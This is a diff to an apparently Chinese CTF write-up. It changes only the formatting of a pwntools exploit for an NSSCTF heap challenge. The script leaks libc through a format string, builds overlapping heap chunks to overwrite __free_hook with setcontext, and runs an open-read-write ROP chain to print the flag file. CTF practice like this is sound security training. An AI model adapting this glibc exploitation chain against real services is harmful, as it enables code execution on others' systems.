@@ -315,73 +315,74 @@ tcachebins
 ## 四.Exploit
 
 ```python
-  1 from pwn import*
-  2 io=process(b'./service_patched')
-  3 #io=remote(b'node4.anna.nssctf.cn',21763)
-  4 libc=ELF(b'/home/mixt/pwn/libc6_2.27-3ubuntu1.4_amd64.so')
-  5 #io=remote(b'node4.anna.nssctf.cn',24553)
-  6 #n 78 y 89
-  7 def cmd(choice):
-  8     io.sendlineafter(b'>>',str(choice).encode())
-  9 def add(size,content=b'a'):
- 10     cmd(1)
- 11     io.sendlineafter(b'size',str(size).encode())
- 12     io.recvuntil(b'data')
- 13     io.send(content)
- 14 def delete():
- 15     cmd(1)
- 16     io.sendlineafter(b'size',str(0).encode())
- 17 io.sendafter(b'grilfriend ?',b'78')
- 18 io.recvuntil('reason')
- 19 io.send(b'%a')
- 20 io.recvuntil(b"0x0.")
- 21 libc_base =int(io.recv(13).decode(),16) - 0x3EC7E3
- 22 success("libc_base:" + hex(libc_base))
- 23 cmd(3)
- 24 io.sendafter(b'grilfriend ?',b'89')
- 25 add(0xf0,b'a')
- 26 delete()
- 27 add(0x100,b'a')
- 28 delete()
- 29 add(0x220,b"a"*0x50 + p64(0x170) + p64(0x220-0x50))
- 30 delete()
- 31 add(0xf8,b'a' * 0xf8 + p8(0x71))
- 32 delete()
- 33 add(0x100,b"a")
- 34 delete()
- 35 free_hook=libc_base + libc.symbols['__free_hook']
- 36 setcontext=libc_base + libc.symbols['setcontext'] + 53
- 37 success("setcontext:" + hex(setcontext))
- 38 pop_rdi=0x215bf + libc_base
- 39 pop_rsi=0x23eea + libc_base
- 40 pop_rdx=0x1b96 + libc_base
- 41 ret=0x8aa + libc_base
- 42 write_addr=libc_base + libc.symbols['write']
- 43 read_addr=libc_base + libc.symbols['read']
- 44 open_addr=libc_base + libc.symbols['open']
- 45 add(0x168,b"a"*0x108 + p64(0x400) + p64(free_hook))
- 46 delete()
- 47 flag=free_hook + 0x200
- 48 orw=p64(0) + p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) + p64(open_addr)
- 49 orw+=p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(free_hook + 0x200) + p64(pop_rdx) + p64(0x50) + p64(read_addr)
- 50 orw+=p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(free_hook + 0x200) + p64(pop_rdx) + p64(0x50) + p64(write_addr)
- 51 payload=p64(setcontext)
- 52 payload+=b'\x00' *(0xa0 - len(payload))
- 53 payload+=p64(free_hook + 0xa0) + p64(pop_rdx)
- 54 payload+=orw
- 55 payload+=b'\x00' *(0x200 - len(payload))
- 56 payload+=b'/home/ctf/flag.txt\x00'
- 57 add(0x220,b'a')
- 58 delete()
- 59 gdb.attach(io)
- 60 add(0x220,payload)           #free_hook
- 61 #gdb.attach(io,"b *setcontext + 53")
- 62 delete()
- 63 io.interactive()
+  from pwn import*
+  io=process(b'./service_patched')
+  #io=remote(b'node4.anna.nssctf.cn',21763)
+  libc=ELF(b'/home/mixt/pwn/libc6_2.27-3ubuntu1.4_amd64.so')
+  #io=remote(b'node4.anna.nssctf.cn',24553)
+  #n 78 y 89
+  def cmd(choice):
+      io.sendlineafter(b'>>',str(choice).encode())
+  def add(size,content=b'a'):
+     cmd(1)
+     io.sendlineafter(b'size',str(size).encode())
+     io.recvuntil(b'data')
+     io.send(content)
+ def delete():
+     cmd(1)
+     io.sendlineafter(b'size',str(0).encode())
+ io.sendafter(b'grilfriend ?',b'78')
+ io.recvuntil('reason')
+ io.send(b'%a')
+ io.recvuntil(b"0x0.")
+ libc_base =int(io.recv(13).decode(),16) - 0x3EC7E3
+ success("libc_base:" + hex(libc_base))
+ cmd(3)
+ io.sendafter(b'grilfriend ?',b'89')
+ add(0xf0,b'a')
+ delete()
+ add(0x100,b'a')
+ delete()
+ add(0x220,b"a"*0x50 + p64(0x170) + p64(0x220-0x50))
+ delete()
+ add(0xf8,b'a' * 0xf8 + p8(0x71))
+ delete()
+ add(0x100,b"a")
+ delete()
+ free_hook=libc_base + libc.symbols['__free_hook']
+ setcontext=libc_base + libc.symbols['setcontext'] + 53
+ success("setcontext:" + hex(setcontext))
+ pop_rdi=0x215bf + libc_base
+ pop_rsi=0x23eea + libc_base
+ pop_rdx=0x1b96 + libc_base
+ ret=0x8aa + libc_base
+ write_addr=libc_base + libc.symbols['write']
+ read_addr=libc_base + libc.symbols['read']
+ open_addr=libc_base + libc.symbols['open']
+ add(0x168,b"a"*0x108 + p64(0x400) + p64(free_hook))
+ delete()
+ flag=free_hook + 0x200
+ orw=p64(0) + p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) + p64(open_addr)
+ orw+=p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(free_hook + 0x200) + p64(pop_rdx) + p64(0x50) + p64(read_addr)
+ orw+=p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(free_hook + 0x200) + p64(pop_rdx) + p64(0x50) + p64(write_addr)
+ payload=p64(setcontext)
+ payload+=b'\x00' *(0xa0 - len(payload))
+ payload+=p64(free_hook + 0xa0) + p64(pop_rdx)
+ payload+=orw
+ payload+=b'\x00' *(0x200 - len(payload))
+ payload+=b'/home/ctf/flag.txt\x00'
+ add(0x220,b'a')
+ delete()
+ gdb.attach(io)
+ add(0x220,payload)           #free_hook
+ #gdb.attach(io,"b *setcontext + 53")
+ delete()
+ io.interactive()
 
 ```
 
 题目链接：https://www.nssctf.cn/problem/635
+
 
 
 
